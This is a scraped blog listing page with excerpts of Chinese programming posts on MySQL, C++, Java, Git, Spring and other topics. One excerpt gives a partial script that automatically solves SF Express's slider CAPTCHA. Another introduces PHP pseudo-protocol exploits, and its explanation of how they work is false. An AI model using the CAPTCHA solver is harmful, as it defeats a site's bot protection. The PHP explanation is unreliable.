3、聚簇和非聚簇索引 聚簇索引：数据和索引都存储在叶子节点。只有一个
非聚簇索引：叶子结点只存储数据的主键
回表查询：通过非聚蔟索引查询到索引的主键。但sql的查询字段未在索引的范围内，则需要再次到聚簇索引查询到整行数据。这个过程叫回表。
4、什么叫覆盖索引 覆盖索引指的是查询的时候使用了索引，且返回的列在索引中可以全部找到。
未覆盖索引则会触发回表查询
5、超大分页怎么处理 先分页查询id字段，再子查询查询指定id的数据。
6、索引创建原则 1、数据量大且查询频繁的表
2、常用于查询条件、排序、分组的字段
3、尽量联合索引
4、控制索引数量
5、字段区分度高
7、索引失效场景 违背了联合索引的最左匹配的原则
字段类型不同，int和string类型，查询时发生了强制类型转换
计算和函数导致索引失效
or的查询条件存在非索引列等
%开头的like查询
四、sql优化经验 1、表结构优化、选择正确的数据类型
2、索引优化、索引创建原则
3、sql查询优化，避免索引失效，避免select *查询
4、主从复制，读写分离
5、分库分表
五、事务相关 1、事务特性 ACID: 一致性、隔离性、原子性、持久性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0ea3a6c7d7f2b6b948f6ecb92fcee72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c8813c87eff1c5b666f9ca378332dc2/" rel="bookmark">
			C&#43;&#43; const常量在多文件编程中的3种用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ const常量在多文件编程中的3种用法 《C++多文件编程是什么》一节提到，多文件编程中代码的划分原则是：
将变量、函数或者类的声明部分存放在 .h 文件，对应的实现部分放在 .cpp 文件中。 值得一提得是，此规律适用于大部分场景，但本节要讲的 const 常量是一个例外。
我们知道，用 const 修饰的变量必须在定义的同时进行初始化操作（除非用 extern 修饰，本节后续会讲解）。与此同时，C++ 中 const 关键字的功能有 2 个，
除了表明其修饰的变量为常量外，还将所修饰变量的可见范围限制为当前文件。这意味着，除非 const 常量的定义和 main 主函数位于同一个 .cpp 文件，否则该 const 常量只能在其所在的 .cpp 文件中使用。 那么，如何定义const 常量，才能在其他文件中使用呢？接下来给读者介绍 3 种在 C++ 多文件编程中定义 const 常量的方法。
1) 将const常量定义在.h头文件中 首先介绍一种最常用也最简单的方法，就是将const常量定义在.h文件中。
显然此方式违背了“声明位于 .h 文件，定义（实现）位于 .cpp 文件”的规律。在 C++ 多文件编程中，还有 2 种特殊情况是违背此规律的，分别是类的定义和内联函数的定义，通常情况下它们也都定义在 .h 文件中。
举个例子（实例一）：
1
2
3
4
5
6
7
8
9
10
11
12
//demo.h
#ifndef _DEMO_H
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c8813c87eff1c5b666f9ca378332dc2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c97823176bd2a819512e874d12cfa246/" rel="bookmark">
			Java权限管理系统完整案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、在线演示 在线演示，浏览系统
二、开发工具 开发软件：JDK7.0、MyEclipse 2014
数据库：MySQL5.6
服务器：Tomcat7.0
三、系统介绍 本系统采用了 B/S 体系结构，以 MySql 作为数据库管理数据，以 JSP 作为前端开发语音，采用当前最流行的 SSM 框架（Spring+SpringMVC+MyBatis），标准的 MVC 模式，将整个系统划分为表现层，controller 层，service 层，dao 层四层。下面介绍主要功能：
3.1 权限管理 支持在线分配权限，以角色为表头、菜单为首列。动态加载角色、菜单以及权限，个性化呈现所有信息于一表之中，并且在表中设置权限开关，免去跳转页面的繁琐步骤。横为角色，纵为菜单，用户体验极高的设计相信深得用户青睐。
3.2 角色管理 以树的形式呈现出角色，呈现出用户数量、菜单数量已经按钮数量，完美整合增删改操作！
3.3 菜单管理 以树的形式呈现出菜单，完美整合增删改操作！整合更改菜单图标功能，以及整合该菜单下按钮功能。
3.4 按钮管理 按钮信息管理，完美整合按钮的增删改查功能。所有页面将根据权限动态加载按钮。
3.5 用户管理 对系统用户进行管理，完美整合分页功能。
四、数据库设计 4.1 数据库关系图 用户通过角色与菜单进行关联，简单地说，一个用户拥有若干角色，每一个角色拥有若干菜单，菜单包含按钮，每一个角色拥有若干按钮，构造成用户-角色-菜单-按钮的授权模型，用户与角色之间，角色与权限之间，都是多对多的关系。
4.2 数据库视图 整个系统包含用户表、账号表、角色表、菜单表、按钮表、按钮类型表、用户角色关联表、角色菜单关联表、角色按钮关联表，如下图：
4.3 数据表结构 用户表：t_auth_user 字段名类型长度描述userIDbigint20自增编号accountIDbigint20账户编号userNamevarcha200用户姓名avatarvarchar200头像sigvarchar500签名createTimevarchar200创建时间createUserIDbigint20创建人编号isValidtinyint4是否有效(1有效数据，0无效数据) 角色表：t_auth_role 字段名类型长度描述roleIDbigint20自增编号roleNamevarchar200菜单名称roleAliasvarchar50角色别名parentIDvarchar50父级编号（最高级为0）roleRankint11角色等级（值越低等级越高）contentvarchar500描述内容createTimevarchar200创建时间createUserIDbigint20创建人编号isValidtinyint4是否有效(1有效数据，0无效数据) 菜单表 ：t_auth_menu 字段名类型长度描述menuIDbigint20自增编号menuTypetinyint4菜单类型（1iframe模式，2全屏模式，3外部链接，4通讯系统）menuNamevarchar200菜单名称menuTextvarchar200菜单文本menuPathvarchar255菜单路径menuIconvarchar255菜单图标menuSortint11菜单排序parentIDbigint20父级编号（0代表根目录）menuLeveltinyint4菜单等级isRoottinyint4是否根目录（1是，0否）contentvarchar500描述内容createTimevarchar200创建时间createUserIDbigint20创建人编号isValidtinyint4是否有效(1有效数据，0无效数据) 按钮表：t_auth_action 字段名类型长度描述actionIDbigint20自增编号menuIDbigint20菜单编号actionNamevarchar200按钮名称actionTypebigint20按钮类型（类型表）actionSeattinyint4按钮位置（1头部按钮，2表格按钮）callTypetinyint4调用方式（1样式，2函数，3Layui）actionEventvarchar200按钮路径actionIconvarchar200按钮图标actionSortint11按钮排序contentvarchar500描述内容createTimevarchar200创建时间createUserIDbigint20创建人编号isValidtinyint4是否有效(1有效数据，0无效数据) 用户角色关联表：t_auth_roleuser 字段名类型长度描述ruIDbigint20自增编号roleIDbigint20角色编号userIDbigint20用户编号isValidtinyint4是否有效(1有效数据，0无效数据) 角色菜单关联表：t_auth_rolemenu 字段名类型长度描述rmIDbigint20自增编号roleIDbigint20角色编号menuIDbigint20菜单编号 角色按钮关联表：t_auth_roleaction 字段名类型长度描述raIDbigint20自增编号roleIDbigint20角色编号actionIDbigint20按钮编号 账号表：t_auth_account 字段名类型长度描述accountIDbigint20自增编号userCodevarchar200用户账号userPwdvarchar200用户密码userQQvarchar200QQ账号userWechatvarchar200微信账号userWeibovarchar200微博账号isFrozentinyint4是否被冻结（1已冻结，0没冻结）isValidtinyint4是否有效(1有效数据，0无效数据) 按钮类型表：t_auth_actiontype 字段名类型长度描述typeIDbigint20自增编号typeNamevarchar200类型名称typeSortint11类型排序isValidtinyint4是否有效(1有效数据，0无效数据) 五、部分源码 5.1 以权限功能为例，html代码块 &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c97823176bd2a819512e874d12cfa246/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e7fe1f4b1b14b1c22934b360f39367b/" rel="bookmark">
			【EI会议征稿】第三届区块链、信息技术与智慧金融国际学术会议 (ICBIS2024)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第三届区块链、信息技术与智慧金融国际学术会议 (ICBIS2024)
The 3rd International Academic Conference on Blockchain, Information Technology and Smart Finance
第三届区块链、信息技术与智慧金融国际学术会议 (ICBIS2024) 将于2024年2月23-25日在马来西亚举行。本次会议主要围绕“区块链、信息技术与智慧金融”的最新研究展开，此次会议汇聚了世界各地该领域的专家、学者、研究人员及相关从业人员，分享研究成果，探讨热点问题，为参会者提供最前沿的科技资讯，使其能及时了解行业发展动态、掌握最新技术，拓宽研究视野，推动学术进步。ICBIS2024诚邀您的加入！ 重要信息
大会官网：http://www.icbis.net/（点击参会/投稿/了解详情）
大会时间：2024年2月23-25日
大会地点：马来西亚
接受/拒稿通知：投稿后1周
提交检索：EI，Scopus, CNKI，Google Scholar
征稿主题
区块链智慧金融信息技术 区块链技术的应用
区块链技术的服务
区块链的数据管理
区块链的去中心化模式
区块链的安全
隐私和信任
区块链的智能合约管理
区块链数据模型的设计
区块链的交易管理
数字货币的应用
区块链交易平台
区块链与经济管理
区块链的交易价值
智慧银行
智能投顾
消费金融
5G+智能银行
智慧城市建设
线性回归分析
电子商务与数字业务
人工智能与及金融业的深度融合
互联网金融
金融服务与理财
经济量的增长
金融技术创新和业务创新
金融工具和金融服务
大数据技术在金融监管的应用
数字经济与人工智能技术及应用
信息技术与经济管理
经济学相关算法优化平衡
ARMA时间序列的建模与预测理
经济管理中复杂数据建模
算法在经济管理中的应用
经济大数据挖掘
云计算
经济模型与软件工程
通讯网络
物联网（IoT）
信息系统与安全
模式识别与人工智能
绩效评估与建模应用
信息化经济与企业管理
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e7fe1f4b1b14b1c22934b360f39367b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b27dee9df4a8f25c5038f4d818597bc7/" rel="bookmark">
			Web安全之PHP的伪协议漏洞利用，以及伪协议漏洞防护方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景 今天介绍一个比较冷门的知识，只有在PHP环境中存在的伪协议漏洞，那么什么是PHP伪协议呢？PHP伪协议事实上就是支持的协议与封装协议。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。ctf中的文件包含、文件读取的绕过、正则的绕过等等会需要用到。
二、伪协议的原理 PHP伪协议是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。该技术可以让PHP在读取数据时直接读取内存中的数据，而不需要解析数据报。
PHP伪协议的原理是，在数据报的头部中添加一个特殊的标志位，用于指示该数据报是伪协议数据报。当PHP读取数据报时，它会检查该标志位是否为0.如果标志位为0，则它将直接读取内存中的数据；如果标志位为1，则它将会解析数据报，并根据数据报的头部信息来执行相应的操作。
PHP伪协议的主要应用场景是缓存和压缩数据。通过数据报的头部添加特殊标志位，PHP可以在读取数据时直接读取缓存中的数据，而不需要进行解析。这对于提高缓存命中率和压缩数据非常有用。
需要注意的是，由于PHP伪协议是通过替换数据报的头部信息来实现的，一次它可能会对网络协议的完整性产生冲突。如果网络协议的头部信息被PHP伪协议替换了，可能会导致网络协议的完整性被破坏，从而导致通信中断。因此，在进行网络通信时，需要特别小心使用PHP伪协议技术。
三、伪协议的利用 PHP伪协议共有12种，具体如下：
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
php://stdin, php://stdout 和 php://stderr
php://input
php://output
php://memory 和 php://temp
php://filter
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b27dee9df4a8f25c5038f4d818597bc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e5a3fe2e0eaca29df83162c26a6e8be/" rel="bookmark">
			2023面试自动化测试面试题【含答案】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、你做了几年的测试、自动化测试，说一下 selenium 的原理是什么？ 我做了五年的测试，1年的自动化测试；
selenium 它是用 http 协议来连接 webdriver ，客户端可以使用 Java 或者 Python 各种编程语言来实现；
2、什么项目适合做自动化测试？ 关键字：不变的、重复的、规范的
第一点，需求变化不能太频繁；
第二点，项目周期要足够长，如果自动化代码还没有写完，公司就倒闭了，那也不需要自动化了
第三点，脚本可以重复使用：在一些典型的场景，比如说 “冒烟测试、回归测试” 的地方就是经常使用自动化测试；
第四点，被测试的软件是否规范：比如说是不是有需求文档、规范的接口文档、是否有原型图、你的接口设计是不是比较规范；
第五点，手工测试是无法完成的；比如说一个性能测试，不能同时有 一千只手一直做好点点点，自动化测试的成本不是特别高
3、Python 生成器 和迭代器的区别？ 作为迭代器必须实现两个特定的方法 “iter()，next()” ；
生成器是一种特许的迭代器，支持所有的迭代操作，除此之外生成器还实现了，普通迭代器没有的一些特性；
比如说它可以通过 send 的方法与生成器内部进行数据交互；还有它可以通过 close 方法去进行关闭；甚至还可以通过 throw 方法，引发内部的异常；
4、为什么用 Mac 写代码？ 表面原因是 Mac 方便易用，颜值也高；深层原因是因为现在的服务器，大多都是采用 Linux 系统，而 Mac 系统 和 Linux 系统其实都是基于原来的 Unix 系统开发的；
而 Mac 基本上能够维持我们的开发环境和线上的一致性；
为什么不用 Linux ？
用 Linux 写代码也是一个很好的选择，但是 Linux 的界面操作和他的娱乐功能不是特别强，而 Mac 做到了很好的平衡；
5、你是怎么开展自动化测试工作的？ 第一，根据产品的业务特性整理出来，可以做自动化的一个功能模板；
第二，我们会根据有限级以及人员现状，来制定自动化测试计划；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e5a3fe2e0eaca29df83162c26a6e8be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb84ea0d999acd3c6833368f421e3f1b/" rel="bookmark">
			通过PyAutoGUI&#43;DrissionPage&#43;Cv2，实现滑块的自动验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		访问网页时，每次都需要输入验证码，真的是太麻烦了
每次查询快递的时候，都需要进行验证，不是要输入验证码就是要滑块，那么有没有办法不用那么麻烦呢？当然是有的，要么是和快递公司进行接口对接，要么就是通过快递公司官网进行查询。
作为一个技术的爱好者，也作为一个顺丰快递粉丝，那么就以顺丰快递为例来进行一次技术的可行性研究吧。如果要进行技术对接，可以参考顺丰丰桥的接口即可。这里研究通过顺丰官网的方式来实现快递单号的自动查询。
首先我们要找到顺丰的官网。顺丰官网
在顺丰查询快递单号时，需要通过滑块的滑动来实现验证，那么实现自动查单号路由的难点就是要实现滑块的自动拖拽。
那么我们来整理一下思路和步骤：
1、访问顺丰的官网 顺丰的官方网址：顺丰官网
2、找到单号输入框并自动输入快递单号 3、检索路由，出现滑块拼图弹框出现 4、难点：解决滑块图片的下载、位置的计算、滑块的拖动 5、获取检索结果 那么我们下面就开始进行实现的验证吧。
从个人喜欢用的工具和库来说，
①：我选择用DrissionPage来替代Selenium 来实现对应浏览器的访问和数据获取
②：模拟人工拖拉滑块的动作，使用PyAutoGUI来实现
③：使用Cv2来计算图片位置的计算
1、首先引入需要用到的模块：
import pyautogui from time import sleep from DrissionPage import ChromiumPage import time import requests import cv2 pyautogui.PAUSE = 1 # 调用在执行动作后暂停的秒数，只能在执行一些pyautogui动作后才能使用，建议用time.sleep 2、使用浏览器访问目标网址
# 打开目标页面 def openBrowserPage(): page.get('https://www.sf-express.com/chn/sc') sleep(1.5) 3、找到目标元素（输入框），输入要查询的快递单号，并点击查询
# 在目标页面的目标输入框中，自动填写单号并自动点击查询按钮 def set_postNo(postno): input_area = page.ele('t:div@@class=bill-number') input_area.ele('t:input@@type=text').input(postno) sleep(0.3) input_area.ele('t:button@@class=submit-button').click() sleep(1) 4、计算缺口位置
# 计算缺口图片与背景图的距离并移动 def compute_move_postion(): # 等待页面加载完成，便于后续获取验证码（缺口）图片和背景图片 page.wait.load_start() new_Iframe = page.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb84ea0d999acd3c6833368f421e3f1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5965bce42660c40b4bdf99204906d81c/" rel="bookmark">
			uniapp退出关闭当前小程序或APP的简单实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 需求：
1.点击按钮主动退出微信小程序（后台也退出）
2.满足条件触发主动退出微信小程序事件（后台也退出） 方法1：----------按钮退出 &lt;!--此方法只需要在wxml里添加下面代码即可，无需用 bindtap关联函数--&gt; &lt;navigator target="miniProgram" open-type="exit"&gt; &lt;button plain="true"&gt;退出登录&lt;/button&gt; &lt;/navigator&gt; 方法2：---------函数退出 通过在函数内部调用微信提供的API实现退出小程序，配置项包含成功和失败的回调函数：
uni.exitMiniProgram({ success: function() { console.log('退出小程序成功'); }, fail: function(err) { console.log('退出小程序失败', err); } }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5ef824c624ce923950b6980849438f8/" rel="bookmark">
			计算机含金量最高的赛事大全，考研和工作都能加持，这才是该参加的比赛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在计算机相关的赛事数不胜数，但含金量较高的比赛却只有那么几项，做好了你现场就能找到工作，就算是考研也是益处很大，今天给大家总结出来。
就别再折腾一些费时费力但又不讨好的比赛了。
一、ACM国际大学生程序设计竞赛 ACM是美国计算机协会的简称，也是主举办方，赛事名称是International Collegiate Programming Contest，简称ICPC。
ACM赛事是目前全球含金量最高的大学生程序设计比赛了，如果能在这个赛事获奖的话，进入名校或者名企都会顺风顺水，甚至有现场签约的情况出现。同样的，它的难度野可想而知，只建议那些学有余力的同学去参加。
ACM比赛分为区域预赛和全球总决赛两个阶段进行。区域赛一般会在每年的9-12 月在各大洲举行，以大学为单位组队，每支队伍由教练、 3名正式队员，一名后备队员组成参赛；全球总决赛在每年的 3-4 月举行。
具体的规则大家可以去网上查查去年的，有详细的说明，这里我就不过多阐述了。
值得注意的是这个赛事是按比例颁发奖牌，10%金牌、20%银牌、30%铜牌和优胜奖，还会承认区域冠军，比如北美冠军和亚洲冠军等等。
二、GPLT团队程序设计天梯赛 GPLT的含金量虽然没有ACM那么高，但它对保研加分却大有益处，对找工作也算是能够拿得出手的亮点，比一般的项目经验还是要好很多。
GPLT是国内比较出名的算法比赛，竞赛题目均为在线编程题，由搭建在网易服务器上的PAT在线裁判系统自动评判，主要考察参赛队伍的基础程序设计能力、数据结构与算法应用能力，并通过团体成绩体现高校在程序设计教学方面的整体水平。
比赛一般会再3~5月举办，难度不是很大，如果学校有参赛经验的人带的话，系统培训一下也可以取得不错的效果，有兴趣的可以提前准备一下。
三、蓝桥杯 蓝桥杯算是比较亲民的计算机赛事了，不仅有软件开发类的比赛，也有单片机之类的电子设计类比赛，大赛决赛三等奖及以上选手，如获得本校免试推研资格，可获得知名高校的优先面试及录取资格。此外IBM、百度、金证财富等数十家知名企业为优秀的获奖选手提供实习、工作绿色通道，优先安排面试、实习、就业。
报名时间一般为每年9月份-12月份，举办时间一般是报名次年的3月份省赛、6月份决赛，拿到省赛一等奖才能进入在北京举行的全国总决赛。
四、百度之星 百度之星被誉为程序员的“黄埔军校”和“造星工场”，对于入职百度几乎算是开了绿色通道，对于阿里腾讯之类的吸引力可能要小一些，一样是值得参加的比赛，互联网公司还是比较认可的，毕竟国内互联网公司能跟百度扳手腕的也不超过10位数。
百度之星每年都有上万人会参加，大赛是面向全社会开放的，不管是学生还是上班族都可以，它的难度算是中等，也是考虑学生和社会人士的差异。
比赛时间如下：
百度之星主要是用考察算法，你可以使用C，C++，Python及Java等语言解决挑战性算法问题。
五、中国大学生计算机设计大赛 这个比赛对考研会比较有用，工作的话就稍微略显单薄。考研拿国奖对保研很有用处，不过如果是校级的奖项就比较吃力，最起码也得省级才能拿得出手。
大赛以三级竞赛形式开展，校级赛——省级赛——国家级赛（简称“国赛”），不过这个赛事得本科以上的学生才能参加。
六、数据挖掘及 AI 比赛 除了这些常规的算法竞赛以外，最近几年的数据挖掘和AI竞赛也在逐步崛起。这里只做简单介绍，大家有兴趣的可以深入了解。
1.Kaggle 比赛平台。上面有很多赛事，也有很多前人的参赛经验、代码分享，对新手十分友好。
2.天池比赛平台。这是阿里云旗下的大数据平台，经常举办各类数据挖掘赛事，获奖还是挺有分量的。
3.DataFountain。每年举办拥有多个赛道的百万奖金赛事 CCF-BDCI，之前我在这里开启了人生第一个比赛。
4.腾讯广告算法大赛。腾讯官方提供了很多广告点击的数据，奖金丰厚，水平挺高，对入职腾讯有绿色通道。
5.之江杯。之江实验室每年举办的比赛，奖金还是挺多的。
6.KDD-CUP。每年由 ACM 的数据挖掘及知识发现专委会主办的数据挖掘研究领域的国际顶级赛事。
7.DataCastle。注重大数据和人工智能的竞赛平台，成立于 2016 年。
8.FlyAI。提供 GPU 训练资源的 AI 竞赛平台。
9.工业大数据产业创新平台。赛题和工业的真实业务结合的更为紧密一些。
10.JDDC。京东举办的和多伦对话系统相关的比赛。
其他的就不多说了，基本上都是大同小异，如果有漏掉一些重要的赛事，欢迎在评论区留言交流。
七、最后 竞赛虽然是简历中非常闪光的存在，比在校时做的项目和工作中的大部分项目要有含金量，但想在众多竞赛中得奖其实并没有那么容易。
所以，并不建议大家把所有的时间都放在竞赛上。有时间可以参加一直，没时间的话，应该以项目经验和实习经历为主。
感谢你们的阅读和喜欢，我收藏了很多技术干货，可以共享给喜欢我文章的朋友们，如果你肯花时间沉下心去学习，它们一定能帮到你，干货内容包括：
😝朋友们如果有需要的话，可以点击下方链接免费领取或者V扫描下方二维码免费领取🆓
👉CSDN大礼包🎁：全网最全《Python学习资料》免费赠送🆓！（安全链接，放心点击）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7406b097e67098fb61625666cc0834e5/" rel="bookmark">
			Git：学习笔记（日常操作版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明：本文主要学习资源来自大佬廖雪峰 Windows 上参考此链接 Mac 上配置 git 和设置 ssh 生成SSH KEY ， 邮箱填自己的 $ ssh-keygen -t rsa -C 44600937@qq.com 一路回车，生成文件打开创建的 id_rsa.pub 文件，复制内容 //	定位到 id_rsa.pub 文件 cd .ssh // 打开 id_rsa.pub 文件 open id_rsa.pub 填到所需的位置，比如 githubSettings ------&gt; SSH and GPG keys ------&gt; New SSH key
最后说下为什么要设置SSH。git基于多种传输协议，其中最常用的就是https和ssh。都是为了数据传输安全，那么设置ssh密钥的目的是为了节省输入用户名密码的过程，同时保证传输安全。 如果不设置SSH，每次提交代码都需要输入密码，就很麻烦~ 初始化仓库 cd 到该目录下git init 文件添加上传 要添加的文件一定要在仓库目录或子目录git add readme.txt 把文件添加到仓库git commit -m “测试案例添加” 把文件提交到仓库 ， -m 是添加说明的 文件更改后的操作： git status 查看哪些文件有变动git diff readme.txt 查看文件哪里有变动git add 确认修改后添加到仓库git commit -m “修改！！” 提交到仓库 版本回退： git log 查看由近及远的提交日志git reset - - hard HEAD^ 版本回退一个版本 ，回退一个版本是一个^,回退两个版本是^^，一百个是HEAD~100git reset - - hard bf22ac 回退到某个版本号git reflog 查看命令历史 撤销修改： 只是修改文件没有执行add命令，撤销： git checkout - - one.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7406b097e67098fb61625666cc0834e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee32d2464d89cf65e8fd51da31005950/" rel="bookmark">
			【框架篇】统一异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：大家好，我是小杨
📃个人主页：「小杨」的csdn博客
🐳希望大家多多支持🥰一起进步呀！
1，统一异常处理的介绍 统⼀异常处理使⽤的是 @ControllerAdvice + @ExceptionHandler 来实现的，@ControllerAdvice 表示控制器通知类，@ExceptionHandler 是异常处理器，两个结合表示当出现异常的时候执⾏某个通知，也就是执⾏某个⽅法事件。
2，统一异常处理的实现 1，创建一个异常处理类 package com.example.exceptionhandler.common; import org.springframework.web.bind.annotation.ControllerAdvice; @ControllerAdvice public class MyExceptionAdivce { } 2，创建异常检测的类和处理业务方法 2.1，指定异常的处理
@ExceptionHandler(NullPointerException.class) public HashMap&lt;String,Object&gt; doNullPointerException(NullPointerException e){ HashMap&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put("code",-1); result.put("msg","空指针异常：" + e.getMessage()); result.put("data",null); return result; } 2.2，默认异常的处理
@ExceptionHandler(Exception.class) public HashMap&lt;String,Object&gt; doException(Exception e){ HashMap&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put("code",-1); result.put("msg","存在异常：" + e.getMessage()); result.put("data",null); return result; } 2.3，注意事项
当异常处理类中同时存在指定异常的处理和默认异常的处理时，出现异常时是如何处理的呢？
解答：当出现的异常不在指定的异常处理方法列表中，就会调用默认异常处理方法；而在指定的异常处理方法列表中，就调用对应的异常处理方法，匹配顺序为当前类及其子类向上依次匹配。
结语
这就是本期博客的全部内容啦！如果有什么其他的问题无法自己解决，可以在评论区留言哦！
最后，如果你觉得这篇文章写的还不错的话或者有所收获的话，麻烦小伙伴们动动你们的小手，给个三连呗（点赞👍，评论✍，收藏📖），多多支持一下！各位的支持是我最大的动力，后期不断更新优质的内容来帮助大家，一起进步。那我们下期见！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c849828fc2a52f97d0cb5890557d7f3b/" rel="bookmark">
			Linux 内核启动流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 链接脚本vmlinux.ldsLinux 内核启动流程分析Linux 内核入口stext__mmap_switched 函数start_kernel 函数rest_init 函数init 进程 看完Linux 内核的顶层 Makefile 以后再来看 Linux 内核的大致启动流程，Linux 内核的启动流程要比uboot 复杂的多，涉及到的内容也更多，因此本章我们就大致的了解一下Linux 内核的启动流程。
链接脚本vmlinux.lds 要分析Linux 启动流程，同样需要先编译一下Linux 源码，因为有很多文件是需要编译才会生成的。首先分析Linux 内核的连接脚本文件arch/arm/kernel/vmlinux.lds，通过链接脚本可以找到Linux 内核的第一行程序是从哪里执行的。vmlinux.lds 中有如下代码：
示例代码36.1.1 vmlinux.lds 链接脚本 492 OUTPUT_ARCH(arm) 493 ENTRY(stext) 494 jiffies = jiffies_64; 495 SECTIONS 496 { 497 /* 498 * XXX: The linker does not define how output sections are 499 * assigned to input sections when there are multiple statements 500 * matching the same input section name.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c849828fc2a52f97d0cb5890557d7f3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58798cb9e897d287cc5cd9498d6350ea/" rel="bookmark">
			Putty和MobaXterm能正常显示但是无法输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在新的电脑上调试开发板，通过串口去调试，发现使用Putty和MobaXterm作为调试工具时能够正常打印开发板输出的信息，但就是不能输入，怀疑是电脑串口的TX线坏了，但是换成串口调试助手发现又能正常输出打印，这个怀疑被否决掉了。于是有去找这两个软件的设置。发现是串口的Flow control设置不对，导致电脑和开发板的通讯协议不一致。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d3c802250b42b21ae15c080f60febc8/" rel="bookmark">
			【Spring Cloud】声明性REST客户端：Feign
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Cloud Feign ——fallback 服务降级 1. Feign 简介2. Feign 的基础使用2.1 普通 HTTP 请求2.2 Feign 远程调用上传文件接口 1. Feign 简介 Feign 是一个声明式的 HTTP 客户端，它简化了编写基于 REST 的服务间通信代码的过程。在 Spring Cloud 中，Feign 扮演着重要的角色，它具有可插入注释支持，包括Feign注释和JAX-RS注释。Feign还支持可插拔编码器和解码器。Spring Cloud增加了对Spring MVC注释的支持，并使用Spring Web中默认使用的HttpMessageConverters。Spring Cloud 集成Ribbon 和 Eureka或者Nacos 注册中心 以在使用 Feign 时提供负载均衡的http 客户端。
Feign 特性介绍：
声明式 REST 客户端：
Feign 允许开发者使用接口和注解的方式定义对远程 REST 服务的调用，而不需要关心底层的 HTTP 请求和响应处理。在 Feign 中，可以通过接口方法的定义来描述远程服务的各种操作，包括 URL、请求方法、参数等信息。集成负载均衡：
通过整合 Ribbon 负载均衡器，Feign 可以自动实现对指定服务的负载均衡调用。这使得在服务提供者有多个实例的情况下，Feign 可以根据负载均衡策略选择合适的服务实例进行调用。支持多种请求方法：
Feign 支持各种 HTTP 请求方法，如 GET、POST、PUT、DELETE 等，从而使得对远程服务的调用变得非常灵活。动态 URL 和参数绑定：
使用 Feign，可以将参数绑定到 URL 模板中，并将动态的数据传递给远程服务。同时，Feign 也支持将参数绑定到请求体中，以便进行 POST 或 PUT 请求。集成 Hystrix 容错机制：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d3c802250b42b21ae15c080f60febc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2284b685fda767e606e0fa193acdcf4a/" rel="bookmark">
			网络爬虫开发(五)01-爬虫高级——Selenium简介 &amp; 根据平台选择安装selenium-webdriver包 &amp; Selenium的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
